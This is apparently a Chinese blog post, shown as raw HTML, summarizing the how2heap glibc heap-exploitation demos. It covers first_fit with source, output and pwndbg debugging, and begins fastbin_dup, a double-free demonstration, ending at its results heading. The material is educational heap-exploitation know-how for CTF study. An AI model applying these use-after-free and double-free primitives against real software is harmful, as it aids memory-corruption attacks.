@@ -1,0 +1,801 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/fox.jpg">
+  <link rel="icon" href="/img/fox.jpg">
+  
+
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="知世">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="how2heap系列几个与前更新了!!!!大事件,正好寒假时间充裕,不如把how2heap总结一遍算了,千万别咕咕咕了hhh  PS:由于本人才疏学浅,文中可能会有一些理解的不对的地方,欢迎各位斧正 :) 参考网站12345https:&#x2F;&#x2F;ctf-wiki.github.io&#x2F;ctf-wiki&#x2F;pwnhttps:&#x2F;&#x2F;blog.csdn.net&#x2F;liying_1234&#x2F;article&#x2F;detail">
+<meta property="og:type" content="article">
+<meta property="og:title" content="how2heap总结计划一">
+<meta property="og:url" content="https://nightrainy.github.io/2020/01/18/how2heap%E6%80%BB%E7%BB%93%E8%AE%A1%E5%88%92%E4%B8%80/index.html">
+<meta property="og:site_name" content="知世の小屋">
+<meta property="og:description" content="how2heap系列几个与前更新了!!!!大事件,正好寒假时间充裕,不如把how2heap总结一遍算了,千万别咕咕咕了hhh  PS:由于本人才疏学浅,文中可能会有一些理解的不对的地方,欢迎各位斧正 :) 参考网站12345https:&#x2F;&#x2F;ctf-wiki.github.io&#x2F;ctf-wiki&#x2F;pwnhttps:&#x2F;&#x2F;blog.csdn.net&#x2F;liying_1234&#x2F;article&#x2F;detail">
+<meta property="og:locale" content="zh_CN">
+<meta property="article:published_time" content="2020-01-18T08:42:43.000Z">
+<meta property="article:modified_time" content="2020-02-23T09:50:42.000Z">
+<meta property="article:author" content="知世">
+<meta property="article:tag" content="pwning is an art">
+<meta name="twitter:card" content="summary_large_image">
+  
+  
+  
+  <title>how2heap总结计划一 - 知世の小屋</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1749284_5i9bdhy70f8.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1736178_k526ubmyhba.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"nightrainy.github.io","root":"/","version":"1.9.8","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false},"umami":{"src":null,"website_id":null,"domains":null,"start_time":"2024-01-01T00:00:00.000Z","token":null,"api_server":null}},"search_path":"/local-search.xml","include_content_in_search":true};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+
+  
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>知世</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/" target="_self">
+                <i class="iconfont icon-home-fill"></i>
+                <span>首页</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/" target="_self">
+                <i class="iconfont icon-archive-fill"></i>
+                <span>归档</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/" target="_self">
+                <i class="iconfont icon-tags-fill"></i>
+                <span>标签</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/" target="_self">
+                <i class="iconfont icon-user-fill"></i>
+                <span>关于</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/links/" target="_self">
+                <i class="iconfont icon-link-fill"></i>
+                <span>友链</span>
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/rick.png') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="how2heap总结计划一"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2020-01-18 16:42" pubdate>
+          2020年1月18日 下午
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          4.3k 字
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          37 分钟
+        
+      </span>
+    
+
+    
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <h1 id="seo-header">how2heap总结计划一</h1>
+            
+            
+              <div class="markdown-body">
+                
+                <blockquote>
+<p>how2heap系列几个与前更新了!!!!大事件,正好寒假时间充裕,不如把how2heap总结一遍算了,千万别咕咕咕了hhh</p>
+</blockquote>
+<p>PS:由于本人才疏学浅,文中可能会有一些理解的不对的地方,欢迎各位斧正 :)</p>
+<h1 id="参考网站"><a href="#参考网站" class="headerlink" title="参考网站"></a>参考网站</h1><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs awk">https:<span class="hljs-regexp">//</span>ctf-wiki.github.io<span class="hljs-regexp">/ctf-wiki/</span>pwn<br>https:<span class="hljs-regexp">//</span>blog.csdn.net<span class="hljs-regexp">/liying_1234/</span>article<span class="hljs-regexp">/details/</span><span class="hljs-number">52053183</span><br>https:<span class="hljs-regexp">//</span>code.woboq.org/<br>https:<span class="hljs-regexp">//gi</span>thub.com<span class="hljs-regexp">/shellphish/</span>how2heap<span class="hljs-regexp">/tree/m</span>aster/glibc_2.<span class="hljs-number">25</span><br>https:<span class="hljs-regexp">//</span>xz.aliyun.com<span class="hljs-regexp">/t/</span><span class="hljs-number">2582</span><span class="hljs-comment">#toc-4</span><br></code></pre></td></tr></table></figure>
+
+
+<h1 id="前置"><a href="#前置" class="headerlink" title="前置"></a>前置</h1><p>因为分为glibc2.25和glibc2.26,<br>因此我先起一个ubuntu16.04的docker</p>
+<p><em>注:tcache,largebin,unsorted bin为先进后出,fastbin,smallbin为先进先出</em></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">git <span class="hljs-built_in">clone</span> https://github.com/shellphish/how2heap.git<br><span class="hljs-built_in">cd</span> how2heap<br>make<br></code></pre></td></tr></table></figure>
+
+<p>对glibc的内存管理机制不熟的小伙伴,这里强烈推荐华庭师傅的glibc内存管理!!</p>
+<p>虽然版本有些老,但是对理解glibc还是有极大的帮助的</p>
+<h1 id="0x01-first-fit"><a href="#0x01-first-fit" class="headerlink" title="0x01 first-fit"></a>0x01 first-fit</h1><h2 id="源代码"><a href="#源代码" class="headerlink" title="源代码"></a>源代码</h2><p>我们先看看源代码,这里我做了些处理,将一些作者的话删掉了:)</p>
+<p>删掉的话的大概意思就是本文件不是攻击demo,而是对glibc一个选择chunk机制(first-fit)的一个说明,这个机制经常被用在uaf的利用中</p>
+<p>所谓的first-fit就是首次适应算法,这里有一篇文章对常见内存分配算法有一个总结:<br><a target="_blank" rel="noopener" href="https://blog.csdn.net/liying_1234/article/details/52053183">常见内存分配算法</a></p>
+<p>好了,不影响,我们直接看源代码,加了一小点翻译</p>
+<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string.h&gt;</span></span><br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>        <span class="hljs-comment">//分配两个缓冲区,不一定是fastbin,可以比较大的</span><br>        <span class="hljs-built_in">fprintf</span>(stderr, <span class="hljs-string">&quot;Allocating 2 buffers. They can be large, don&#x27;t have to be fastbin.\n&quot;</span>);<br>        <span class="hljs-type">char</span>* a = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x512</span>);<br>        <span class="hljs-type">char</span>* b = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x256</span>);<br>        <span class="hljs-type">char</span>* c;<br><br>        <span class="hljs-built_in">fprintf</span>(stderr, <span class="hljs-string">&quot;1st malloc(0x512): %p\n&quot;</span>, a);<br>        <span class="hljs-built_in">fprintf</span>(stderr, <span class="hljs-string">&quot;2nd malloc(0x256): %p\n&quot;</span>, b);<br>        <span class="hljs-built_in">fprintf</span>(stderr, <span class="hljs-string">&quot;we could continue mallocing here...\n&quot;</span>);<br>        <span class="hljs-built_in">fprintf</span>(stderr, <span class="hljs-string">&quot;now let&#x27;s put a string at a that we can read later \&quot;this is A!\&quot;\n&quot;</span>);<br>        <span class="hljs-built_in">strcpy</span>(a, <span class="hljs-string">&quot;this is A!&quot;</span>);<br>        <span class="hljs-built_in">fprintf</span>(stderr, <span class="hljs-string">&quot;first allocation %p points to %s\n&quot;</span>, a, a);<br><br>        <span class="hljs-built_in">fprintf</span>(stderr, <span class="hljs-string">&quot;Freeing the first one...\n&quot;</span>);<br>        <span class="hljs-built_in">free</span>(a);<br><br>        <span class="hljs-comment">//我们不用再释放其他的缓冲区了,只要我们分配的小于0x512,就可以从刚刚free的内存里取</span><br>        <span class="hljs-built_in">fprintf</span>(stderr, <span class="hljs-string">&quot;We don&#x27;t need to free anything again. As long as we allocate smaller than 0x512, it will end up at %p\n&quot;</span>, a);<br><br><br>        <span class="hljs-built_in">fprintf</span>(stderr, <span class="hljs-string">&quot;So, let&#x27;s allocate 0x500 bytes\n&quot;</span>);<br>        c = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x500</span>);<br>        <span class="hljs-built_in">fprintf</span>(stderr, <span class="hljs-string">&quot;3rd malloc(0x500): %p\n&quot;</span>, c);<br>        <span class="hljs-built_in">fprintf</span>(stderr, <span class="hljs-string">&quot;And put a different string here, \&quot;this is C!\&quot;\n&quot;</span>);<br>        <span class="hljs-built_in">strcpy</span>(c, <span class="hljs-string">&quot;this is C!&quot;</span>);<br>        <span class="hljs-built_in">fprintf</span>(stderr, <span class="hljs-string">&quot;3rd allocation %p points to %s\n&quot;</span>, c, c);<br>        <span class="hljs-built_in">fprintf</span>(stderr, <span class="hljs-string">&quot;first allocation %p points to %s\n&quot;</span>, a, a);<br>        <span class="hljs-built_in">fprintf</span>(stderr, <span class="hljs-string">&quot;If we reuse the first allocation, it now holds the data from the third allocation.\n&quot;</span>);<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<h2 id="程序结果"><a href="#程序结果" class="headerlink" title="程序结果"></a>程序结果</h2><p>我们再运行一下程序</p>
+<figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs applescript">This <span class="hljs-built_in">file</span> doesn&#x27;t demonstrate an attack, <span class="hljs-keyword">but</span> shows <span class="hljs-keyword">the</span> nature <span class="hljs-keyword">of</span> glibc&#x27;s allocator.<br>glibc uses a <span class="hljs-keyword">first</span>-fit algorithm <span class="hljs-keyword">to</span> select a free chunk.<br>If a chunk <span class="hljs-keyword">is</span> free <span class="hljs-keyword">and</span> large enough, malloc will select this chunk.<br>This can be exploited <span class="hljs-keyword">in</span> a use-<span class="hljs-keyword">after</span>-free situation.<br>Allocating <span class="hljs-number">2</span> buffers. They can be large, don&#x27;t have <span class="hljs-keyword">to</span> be fastbin.<br><span class="hljs-number">1</span>st malloc(<span class="hljs-number">0x512</span>): <span class="hljs-number">0x1e03010</span><br><span class="hljs-number">2</span>nd malloc(<span class="hljs-number">0x256</span>): <span class="hljs-number">0x1e03530</span><br>we could <span class="hljs-keyword">continue</span> mallocing here...<br>now let&#x27;s <span class="hljs-keyword">put</span> a <span class="hljs-built_in">string</span> <span class="hljs-keyword">at</span> a <span class="hljs-keyword">that</span> we can <span class="hljs-built_in">read</span> later <span class="hljs-string">&quot;this is A!&quot;</span><br><span class="hljs-keyword">first</span> allocation <span class="hljs-number">0x1e03010</span> points <span class="hljs-keyword">to</span> this <span class="hljs-keyword">is</span> A!<br>Freeing <span class="hljs-keyword">the</span> <span class="hljs-keyword">first</span> one...<br>We don&#x27;t need <span class="hljs-keyword">to</span> free anything again. As long <span class="hljs-keyword">as</span> we allocate smaller than <span class="hljs-number">0x512</span>, <span class="hljs-keyword">it</span> will <span class="hljs-keyword">end</span> up <span class="hljs-keyword">at</span> <span class="hljs-number">0x1e03010</span><br>So, let&#x27;s allocate <span class="hljs-number">0x500</span> bytes<br><span class="hljs-number">3</span>rd malloc(<span class="hljs-number">0x500</span>): <span class="hljs-number">0x1e03010</span><br>And <span class="hljs-keyword">put</span> a different <span class="hljs-built_in">string</span> here, <span class="hljs-string">&quot;this is C!&quot;</span><br><span class="hljs-number">3</span>rd allocation <span class="hljs-number">0x1e03010</span> points <span class="hljs-keyword">to</span> this <span class="hljs-keyword">is</span> C!<br><span class="hljs-keyword">first</span> allocation <span class="hljs-number">0x1e03010</span> points <span class="hljs-keyword">to</span> this <span class="hljs-keyword">is</span> C!<br>If we reuse <span class="hljs-keyword">the</span> <span class="hljs-keyword">first</span> allocation, <span class="hljs-keyword">it</span> now holds <span class="hljs-keyword">the</span> data <span class="hljs-keyword">from</span> <span class="hljs-keyword">the</span> <span class="hljs-keyword">third</span> allocation.<br></code></pre></td></tr></table></figure>
+
+<h2 id="关键部分调试"><a href="#关键部分调试" class="headerlink" title="关键部分调试"></a>关键部分调试</h2><p>因为内容比较简单,这里就做一个写入内容的对比吧</p>
+<ol>
+<li>首先在写c之前下一个断点</li>
+</ol>
+<figure class="highlight nix"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs nix">pwndbg<span class="hljs-operator">&gt;</span><br><span class="hljs-number">31</span>              fprintf(stderr, <span class="hljs-string">&quot;3rd malloc(0x500): %p<span class="hljs-char escape_">\n</span>&quot;</span>, c);<br><span class="hljs-number">32</span>              fprintf(stderr, <span class="hljs-string">&quot;And put a different string here, <span class="hljs-char escape_">\&quot;</span>this is C!<span class="hljs-char escape_">\&quot;</span><span class="hljs-char escape_">\n</span>&quot;</span>);<br><span class="hljs-number">33</span>              strcpy(c, <span class="hljs-string">&quot;this is C!&quot;</span>);<br><span class="hljs-number">34</span>              fprintf(stderr, <span class="hljs-string">&quot;3rd allocation %p points to %s<span class="hljs-char escape_">\n</span>&quot;</span>, c, c);<br><span class="hljs-number">35</span>              fprintf(stderr, <span class="hljs-string">&quot;first allocation %p points to %s<span class="hljs-char escape_">\n</span>&quot;</span>, a, a);<br><span class="hljs-number">36</span>              fprintf(stderr, <span class="hljs-string">&quot;If we reuse the first allocation, it now holds the data from the third allocation.<span class="hljs-char escape_">\n</span>&quot;</span>);<br><span class="hljs-number">37</span>      &#125;<br>pwndbg<span class="hljs-operator">&gt;</span> b <span class="hljs-number">32</span><br>Breakpoint <span class="hljs-number">1</span> at <span class="hljs-number">0</span><span class="hljs-params">x400842:</span> file first_fit.c, line <span class="hljs-number">32</span>.<br></code></pre></td></tr></table></figure>
+
+<ol start="2">
+<li>运行一下康康<br>程序停在了第32行</li>
+</ol>
+<figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs applescript"><span class="hljs-number">1</span>st malloc(<span class="hljs-number">0x512</span>): <span class="hljs-number">0x603010</span><br><span class="hljs-number">2</span>nd malloc(<span class="hljs-number">0x256</span>): <span class="hljs-number">0x603530</span><br>we could <span class="hljs-keyword">continue</span> mallocing here...<br>now let&#x27;s <span class="hljs-keyword">put</span> a <span class="hljs-built_in">string</span> <span class="hljs-keyword">at</span> a <span class="hljs-keyword">that</span> we can <span class="hljs-built_in">read</span> later <span class="hljs-string">&quot;this is A!&quot;</span><br><span class="hljs-keyword">first</span> allocation <span class="hljs-number">0x603010</span> points <span class="hljs-keyword">to</span> this <span class="hljs-keyword">is</span> A!<br>Freeing <span class="hljs-keyword">the</span> <span class="hljs-keyword">first</span> one...<br>We don&#x27;t need <span class="hljs-keyword">to</span> free anything again. As long <span class="hljs-keyword">as</span> we allocate smaller than <span class="hljs-number">0x512</span>, <span class="hljs-keyword">it</span> will <span class="hljs-keyword">end</span> up <span class="hljs-keyword">at</span> <span class="hljs-number">0x603010</span><br>So, let&#x27;s allocate <span class="hljs-number">0x500</span> bytes<br><span class="hljs-number">3</span>rd malloc(<span class="hljs-number">0x500</span>): <span class="hljs-number">0x603010</span><br></code></pre></td></tr></table></figure>
+
+<p>那我们先看看a的内容吧</p>
+<figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs llvm">pwndbg&gt; p a<br>$<span class="hljs-number">17</span> <span class="hljs-operator">=</span> <span class="hljs-number">0x603010</span> <span class="hljs-string">&quot;<span class="hljs-char escape_">\25</span>0<span class="hljs-char escape_">\03</span>7<span class="hljs-char escape_">\33</span>5<span class="hljs-char escape_">\36</span>7<span class="hljs-char escape_">\37</span>7<span class="hljs-char escape_">\17</span>7&quot;</span><br></code></pre></td></tr></table></figure>
+
+<p>然后再看下c的内容</p>
+<figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs llvm">pwndbg&gt; p <span class="hljs-keyword">c</span><br>$<span class="hljs-number">18</span> <span class="hljs-operator">=</span> <span class="hljs-number">0x603010</span> <span class="hljs-string">&quot;<span class="hljs-char escape_">\25</span>0<span class="hljs-char escape_">\03</span>7<span class="hljs-char escape_">\33</span>5<span class="hljs-char escape_">\36</span>7<span class="hljs-char escape_">\37</span>7<span class="hljs-char escape_">\17</span>7&quot;</span><br></code></pre></td></tr></table></figure>
+
+<p>可以看到此时a,c位于同一内存空间</p>
+<p>现在两个单步直接给c赋值为”this is c”<br>此时康康a和c的内容</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">pwndbg&gt; </span><span class="language-bash">p a</span><br><span class="hljs-meta prompt_">$</span><span class="language-bash">19 = 0x603010 <span class="hljs-string">&quot;this is C!&quot;</span></span><br><span class="hljs-meta prompt_">pwndbg&gt; </span><span class="language-bash">p c</span><br><span class="hljs-meta prompt_">$</span><span class="language-bash">20 = 0x603010 <span class="hljs-string">&quot;this is C!&quot;</span></span><br></code></pre></td></tr></table></figure>
+<p>更改c时成功更改了a的内容</p>
+<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>可以看到程序先分配了两个chunk块a(0x512),b(0x256)</p>
+<p>然后给a赋值为”this is A”,释放a,之后分配c(0x500)</p>
+<p>然后给C赋值为”this is C”,此时输出a,c的地址和内容</p>
+<p>发现a块和c块内存地址相同,但a的内容改为了C,程序成功通过修改c来修改来a块</p>
+<p>而这也可以通过修改a块来修改c块的内容,而这也是一个uaf漏洞(free后并未置0) :)</p>
+<p>first-fit的内容比较简单,这里也不再多讲,进入下一个</p>
+<h1 id="0x02-fastbin-dup"><a href="#0x02-fastbin-dup" class="headerlink" title="0x02 fastbin_dup"></a>0x02 fastbin_dup</h1><h2 id="源代码-1"><a href="#源代码-1" class="headerlink" title="源代码"></a>源代码</h2><p>还是先看源代码</p>
+<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>        <span class="hljs-comment">//一个基于fasstbin的简单的double-free利用</span><br>        <span class="hljs-built_in">fprintf</span>(stderr, <span class="hljs-string">&quot;This file demonstrates a simple double-free attack with fastbins.\n&quot;</span>);<br><br>        <span class="hljs-built_in">fprintf</span>(stderr, <span class="hljs-string">&quot;Allocating 3 buffers.\n&quot;</span>);<br>        <span class="hljs-type">int</span> *a = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">8</span>);<br>        <span class="hljs-type">int</span> *b = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">8</span>);<br>        <span class="hljs-type">int</span> *c = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">8</span>);<br><br>        <span class="hljs-built_in">fprintf</span>(stderr, <span class="hljs-string">&quot;1st malloc(8): %p\n&quot;</span>, a);<br>        <span class="hljs-built_in">fprintf</span>(stderr, <span class="hljs-string">&quot;2nd malloc(8): %p\n&quot;</span>, b);<br>        <span class="hljs-built_in">fprintf</span>(stderr, <span class="hljs-string">&quot;3rd malloc(8): %p\n&quot;</span>, c);<br><br>        <span class="hljs-built_in">fprintf</span>(stderr, <span class="hljs-string">&quot;Freeing the first one...\n&quot;</span>);<br>        <span class="hljs-built_in">free</span>(a);<br>        <span class="hljs-comment">//如果再free一次a,程序就会crash,因为a是free链上的最顶的chunk</span><br>        <span class="hljs-built_in">fprintf</span>(stderr, <span class="hljs-string">&quot;If we free %p again, things will crash because %p is at the top of the free list.\n&quot;</span>, a, a);<br>        <span class="hljs-comment">// free(a);</span><br>        <span class="hljs-comment">//因此我们free b</span><br>        <span class="hljs-built_in">fprintf</span>(stderr, <span class="hljs-string">&quot;So, instead, we&#x27;ll free %p.\n&quot;</span>, b);<br>        <span class="hljs-built_in">free</span>(b);<br>        <span class="hljs-comment">//现在再free一次a</span><br>        <span class="hljs-built_in">fprintf</span>(stderr, <span class="hljs-string">&quot;Now, we can free %p again, since it&#x27;s not the head of the free list.\n&quot;</span>, a);<br>        <span class="hljs-built_in">free</span>(a);<br>        <span class="hljs-comment">//现在我们的free链变成了 a-&gt;b-&gt;a</span><br>        <span class="hljs-built_in">fprintf</span>(stderr, <span class="hljs-string">&quot;Now the free list has [ %p, %p, %p ]. If we malloc 3 times, we&#x27;ll get %p twice!\n&quot;</span>, a, b, a, a);<br>        <span class="hljs-built_in">fprintf</span>(stderr, <span class="hljs-string">&quot;1st malloc(8): %p\n&quot;</span>, <span class="hljs-built_in">malloc</span>(<span class="hljs-number">8</span>));<br>        <span class="hljs-built_in">fprintf</span>(stderr, <span class="hljs-string">&quot;2nd malloc(8): %p\n&quot;</span>, <span class="hljs-built_in">malloc</span>(<span class="hljs-number">8</span>));<br>        <span class="hljs-built_in">fprintf</span>(stderr, <span class="hljs-string">&quot;3rd malloc(8): %p\n&quot;</span>, <span class="hljs-built_in">malloc</span>(<span class="hljs-number">8</span>));<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<h2 id="运行结果"><a href="#运行结果" class="headerlink" title="运行结果"></a>运行结果</h2><p>运行一下康康</p>
